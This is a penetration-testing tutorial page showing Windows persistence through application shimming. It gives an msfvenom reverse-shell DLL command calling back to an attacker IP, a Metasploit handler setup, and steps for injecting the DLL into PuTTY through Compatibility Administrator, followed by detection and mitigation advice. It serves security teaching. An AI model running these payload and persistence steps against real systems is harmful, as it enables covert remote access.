@@ -1,0 +1,130 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Persistence using Application Shimming</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-using-application-shimming/" rel="bookmark"><time class="entry-date published" datetime="2020-01-26T13:01:28+00:00">January 26, 2020</time><time class="updated" datetime="2025-05-12T16:51:04+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we are going to describe the persistence of the Application Shimming and how vital it is in Windows Penetration Testing.</span></p>
+<p><span style="color: #000000;">Application Shimming is a technique used on Windows OS that can be used to make the applications developed for earlier versions of Windows OS still work on the latest version of Windows</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Introduction</span></strong>
+<ul>
+<li><span style="color: #000000;">What is Application Shimming?</span></li>
+<li><span style="color: #000000;">How does Application Shimming work?</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Configurations used in Practical</span></strong></li>
+<li><strong><span style="color: #000000;">Persistence using Application Shimming</span></strong>
+<ul>
+<li><span style="color: #000000;">Malicious DLL Creation</span></li>
+<li><span style="color: #000000;">Injecting Malicious DLL</span></li>
+<li><span style="color: #000000;">Installing Infected Executable</span></li>
+<li><span style="color: #000000;">Gaining Persistent Shell</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Detection</span></strong></li>
+<li><strong><span style="color: #000000;">Mitigation</span></strong></li>
+<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
+</ul>
+<h3><span style="color: #800000;">Introduction </span></h3>
+<h4><span style="color: #000000;">What is Application Shimming?</span></h4>
+<p><span style="color: #000000;">Ever since the early stages of Microsoft Windows, there have been some fundamental features that have been part of the Windows’ basic Functionalities. One of them is their “Backward Compatibility.” What it means is that if you developed your Software earlier, like at the time of Windows XP. But now we have Windows 10, and you are worried that Windows will be able to run that piece of software since it has been updated. Here, the Backward Compatibility comes into play. It allows us to run the software on the Windows OS that developers did not create for that particular OS.</span></p>
+<p><span style="color: #000000;">The “Shim Infrastructure” or how they like to call it at the big house “Microsoft Windows Application Compatibility Infrastructure” helped its user get that backward compatibility. Now the thing to keep in mind is that during all those years of development, Windows kept its basic Architecture the same. They developed around the same framework that they started to work in the early nineties. This means that there are still some bits of code in the Windows 10 that has been there since the times of Windows 95.</span></p>
+<h4><span style="color: #000000;">How does Application Shimming Work?</span></h4>
+<p><span style="color: #000000;">The Shim Infrastructure applies a method of Application Programming Interface (API) hooking. Explicitly, it forces the nature of linking to redirect API calls from Windows itself to alternative code – the shim itself. The Windows Portable Executable (PE) and Common Object Format (COFF) Specification includes several headers, and the data directories in this header provide a layer of indirection between the application and the linked file. Calls to external binary files take place through the Import Address Table (IAT). Consequently, a call into Windows looks like the image shown below to the system.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-MZ9QL1G76-I/Xi2KFr9qY5I/AAAAAAAAiXY/FChUtdlMMTM2euWZq3mT0UaUp324r4V7gCLcBGAsYHQ/s1600/1.png"/></p>
+<p><span style="color: #000000;">We can modify the address of the Windows function fixed in the import table, and then replace it with a pointer to a function into the alternate shim code, as shown in the image given below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IAS1tzJGKOM/Xi2KIbHU6GI/AAAAAAAAiX4/x4TpdjzgU5w5bpi5BV7fQygGh8_Bc3INwCLcBGAsYHQ/s1600/2.png"/></p>
+<p><span style="color: #000000;">This indirection happens statically linked .dll files when the application is loaded. You can also shim dynamically linked .dll files by hooking it with an API.</span></p>
+<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
+<p><strong><span style="color: #000000;">Attacker:</span></strong></p>
+<p><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2019.4</span></p>
+<p><span style="color: #000000;"><strong>Tools:</strong> <a style="color: #000000;" href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">MSFVenom</a>, <a style="color: #000000;" href="https://www.metasploit.com/">Metasploit Framework</a></span></p>
+<p><strong><span style="color: #000000;">Target:</span></strong></p>
+<p><span style="color: #000000;"><strong>OS:</strong> Windows 10 (Build 1909)</span></p>
+<p><span style="color: #000000;"><strong>Tools:</strong> <a style="color: #000000;" href="https://docs.microsoft.com/it-it/windows-hardware/get-started/adk-install">Windows Assessment and Deployment Kit (Windows ADK)</a>, <a style="color: #000000;" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">PuTTY.exe</a></span></p>
+<p><span style="color: #000000;">You can download the Tools by clicking on Their Name.</span></p>
+<h3><span style="color: #800000;">Persistence using Application Shimming</span></h3>
+<p><span style="color: #000000;">Application Shimming can perform many functions but we will be focusing on gaining a persistence shell on the Target System for now. This practical was tested in a lab-controlled environment where we have the configurations set for minimum interference. The actual real-life scenario can differ.</span></p>
+<h4><span style="color: #000000;">Malicious DLL Creation </span></h4>
+<p><span style="color: #000000;">We choose to use the MSFVenom tool to construct a payload in order to start the exploitation. We gained a shell by using the reverse_tcp payload with the Windows system as the target. After defining the LHOST for the attacker system’s IP address, we specified the LPORT on which the target machine will send us the session. We called this payload inject.dll and constructed it as a Dynamic Link Library, or DLL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell/reverse_tcp lport=9999 lhost=192.168.1.2 -f dll &gt; inject.dll</pre>
+<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-vNmm_yiCgX0/Xi2KI9UkIJI/AAAAAAAAiX8/bjJ4S8cUJn00V2OXZh73udLjMm4ACfp5wCLcBGAsYHQ/s1600/3.png" alt="Windows Persistence using Application Shimming" width="778" height="188"/></p>
+<p><span style="color: #000000;">As discussed in the Configurations used section we need the Windows Assessment and Deployment Kit. After downloading and installing it, we have a service inside it. It’s called Compatibility Administrator. We are going to need it to proceed further.</span></p>
+<p><span style="color: #000000;">Now we transfer the recently created DLL to the Target Machine from our Attacker Machine. We use the Python one-liner for it. Many ways exist to accomplish this. We configure a Multi/Handler on the Attacker Machine to receive the session that will be generated soon.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -SimpleHTTPServer 80
+msfconsole
+use multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 192.168.1.2
+set lport 9999
+run</pre>
+<h4><span style="color: #000000;">Injecting Malicious DLL</span></h4>
+<p><span style="color: #000000;">Now we will divert our attention to the Target Machine. After browsing the IP Address of the Attacker Machine and downloading the Malicious DLL file, we open the Compatibility Administrator as shown in the image given below. Here we are using the 32-bit version as it is easier to bind the DLL to it. We also created a new custom Database.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LZNGbpa5OxY/Xi2KJHDkaSI/AAAAAAAAiYA/OfXcBM2sXE0U5UpE0r6mEtURaxHxOV8JwCLcBGAsYHQ/s1600/4.png"/></p>
+<h5><span style="color: #000000;">Creating a New Application Fix</span></h5>
+<p><span style="color: #000000;">Next, we bind the safe, original executable to the malicious DLL file. Right-click on the newly created database and choose the <strong data-start="628" data-end="642">Create New</strong> option from the dropdown menu. This opens a sub-menu where we select <strong data-start="712" data-end="731">Application Fix</strong>. You can also use the shortcut <strong data-start="763" data-end="775">Ctrl + P</strong> to access this option.</span></p>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5gC6EH0Yd64/Xi2KJUy_RmI/AAAAAAAAiYE/h3HS5p8fAHstG4ki6XKBPtTTxEgh9nWJACLcBGAsYHQ/s1600/5.png" alt="Windows Persistence using Application Shimming" width="749" height="519"/></p>
+<p><span style="color: #000000;">As soon as we click on that Application Fix option, we have ourselves a Config Window Titled “Create New Application Fix”. We enter the name of the Program to be fixed as “putty”. And we provide the path of the executable to the program we want to inject our malicious DLL into. In this case, we provide the path of the PuTTY.exe and hit Next.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-uBpcEWYW8D0/Xi2KJufQ4jI/AAAAAAAAiYI/1ysNgZDzL9wgV6jeZoKiI955QcAXoIL8ACLcBGAsYHQ/s1600/6.png"/></p>
+<p><span style="color: #000000;">Now we are asked the compatibility modes. This would have been important if we were fixing a genuine executable. Or using the Shimming for genuine purposes. As we are not doing any of that, we will skip this step and straight-up hit the “Next” button and move on.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-RgUYAqOAMXw/Xi2KKFfHttI/AAAAAAAAiYM/Eix5dhStPA0zU6FR0PLJLdbUBJ9KkAO8gCLcBGAsYHQ/s1600/7.png"/></p>
+<h5><span style="color: #000000;">Injecting DLL</span></h5>
+<p><span style="color: #000000;">Now we are at an important step. We are asked the compatibility fix that we want to apply to the executable. We choose the “InjectDll” option from the list as shown in the image given below. After checking the box we hit the “Parameters” button to provide the path of out malicious DLL that we created at the start of the exploitation.</span></p>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-Md89FD2jHfo/Xi2KKc-E2KI/AAAAAAAAiYQ/9qy2B7Qe-gAdZf_O4MgTkSWEpFEDak5QQCLcBGAsYHQ/s1600/8.png" alt="Windows Persistence using Application Shimming" width="477" height="432"/></p>
+<p><span style="color: #000000;">This opens up a new small window asking the Command-Line. Here we provide the path of our malicious DLL and click OK button.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-C2Pq7XO1HvM/Xi2KKj-5uPI/AAAAAAAAiYU/9nfRGzNS0PobX3M1iaf_2b-wnBS7GHNSQCLcBGAsYHQ/s1600/9.png"/></p>
+<p><span style="color: #000000;">Back to our config window, we click the Next Button, and now we have the Matching Information panel in front of us. We click on the “Unselect All” Button as we don’t want to add any additional configurations to our payload. At last, we hit the Finish Button.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PGA5Dt61FIM/Xi2KF4MO70I/AAAAAAAAiXc/XsLzoY3aw8ca1KOa8K5JQMW4TvwcfG79wCLcBGAsYHQ/s1600/10.png"/></p>
+<h5><span style="color: #000000;">Saving the Configuration and Database</span></h5>
+<p><span style="color: #000000;">The configuration window is now closed. The Compatibility Administrator window has returned. As seen in the figure below, we inject our DLL into the PuTTY executable by clicking the Save button.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-D2FLyr9vhMo/Xi2KF5AiQkI/AAAAAAAAiXg/Sj4zURcbR1o4N0dhJnE2O8zqYlBtBpCYACLcBGAsYHQ/s1600/11.png" alt="Windows Persistence using Application Shimming" width="683" height="379"/></p>
+<p><span style="color: #000000;">We are asked to name the database, we name it puttyshim. This can be whatever you want. In real life, attacking situations choose the name that is less conspicuous.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-hldJJXXbHHk/Xi2KGytk78I/AAAAAAAAiXk/8UB2k2bLDtcfDne0YSPTWZU6VriHEUmcwCLcBGAsYHQ/s1600/12.png"/></p>
+<p><span style="color: #000000;">After naming the database, the system asks us for the location where we want to save the AppCompat Database or the .sdb file of the complete configuration.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-bJQ5geLfdO0/Xi2KHFbe2oI/AAAAAAAAiXo/HIfNo9vzJ9QfwtUXzy8_VWbW-j7qvHTBgCLcBGAsYHQ/s1600/13.png"/></p>
+<h4><span style="color: #000000;">Installing Infected Executable</span></h4>
+<p><span style="color: #000000;">Now that this step is complete, we will proceed to install the infected executable on the target machine. Right-click on the name of the database and select the Install option from the drop-down menu.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-LEL2A92EraM/Xi2KHXsbN6I/AAAAAAAAiXs/gdxcDvmbh9gVwY86eSEX4N8Y5giBgjF4QCLcBGAsYHQ/s1600/14.png" alt="Windows Persistence using Application Shimming" width="384" height="222"/></p>
+<p><span style="color: #000000;">This initiates an installation process that will install our infected executable as a service. We can see that in the Programs and Features section inside the Control Panel as shown in the image below. If we had added the Publisher or Vendor Information at the earlier stage it would have appeared here.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-KijbfcGayYg/Xi2KH4fhTmI/AAAAAAAAiXw/AXIJix7qzm0MIjGZNY1Tywj5gyg3F0DLwCLcBGAsYHQ/s1600/15.png"/></p>
+<h4><span style="color: #000000;">Gaining Persistent Shell</span></h4>
+<p><span style="color: #000000;">Now when we execute the service that we just shimmed and installed. As soon as we have the program executed on the target machine, we will receive a shell on our attacker machine as shown in the image below. We can add the infected service in the startup service list to receive the shell every time the Target system reboots.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-bIE52MoM0Mo/Xi2KIH18uYI/AAAAAAAAiX0/Zn3ptfI0Zg0qdsFrzy9NqpC6pdumOTiYwCLcBGAsYHQ/s1600/16.png" alt="Windows Persistence using Application Shimming" width="769" height="295"/></p>
+<p><span style="color: #000000;">This concluded the exploitation. Now let’s talk defense mechanisms.</span></p>
+<h3><span style="color: #800000;">Detection</span></h3>
+<p><span style="color: #000000;">Many tools are available that can detect the applications that developers have shimmed.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Shim-File-Scan</strong><strong>ner:</strong> Scans Files/Folders for non-default shims and checks registry for installed shims</span></li>
+<li><span style="color: #000000;"><strong>Shim-</strong><strong>Process-Scanner: </strong>Will search all process for shim flags and also check for the Shim App Helper</span></li>
+</ul>
+<p><span style="color: #000000;">Other than that the process of shimming creates a bloody trail that leads right to the smoking gun aka the shimmed application. Shimming creates a trial inside the Registry at the following locations.</span></p>
+<ul>
+<li><span style="color: #000000;">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom</span></li>
+<li><span style="color: #000000;">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB</span></li>
+</ul>
+<p><span style="color: #000000;">Apart from the registry, we have some locations on the Drives where we can find evidence for the Application Shimming.</span></p>
+<ul>
+<li><span style="color: #000000;">C:\Windows\AppPatch\Custom\</span></li>
+<li><span style="color: #000000;">C:\Windows\AppPatch\Custom\Custom64\</span></li>
+</ul>
+<p><span style="color: #000000;">We can also create custom Yara Rules and snort rules that could detect Application Shimming.</span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<p><span style="color: #000000;">As always, the first line of defense against any kind of attack is keeping our infrastructure and devices updated. Microsoft released this <a style="color: #000000;" href="https://www.microsoft.com/en-us/download/details.aspx?id=46804">patch</a> for restricting the Shim Application to bypass the UAC.</span></p>
+<p><span style="color: #000000;">Some tools like the one in the Detection section can be used for mitigating the Applications Shimming.</span></p>
+<p><span style="color: #000000;">Shim-Guard: Detects and alert on newly installed shims</span></p>
+<p><span style="color: #000000;">We can also implement strict UAC policies to notify when a user is getting elevated privileges.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">This kind of attack is very much happening in real life. Multiple incidents targeted different environments where attackers executed large-scale compromises using Application Shimming.</span></p>
+<p><span style="color: #000000;">Stay Tuned!</span></p>
+<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1138/">MITRE|ATT&amp;CK</a></span></p>
+<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf">Black Hat USA</a></span></p>
+<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html">FireEye</a></span></p>
+<p><span style="color: #000000;">To learn more about Windows Persistence. Follow this <strong><a href="https://www.hackingarticles.in/tag/windows-persistence/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact</span> <a href="https://www.linkedin.com/in/kavish-tyagi-844239125/"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
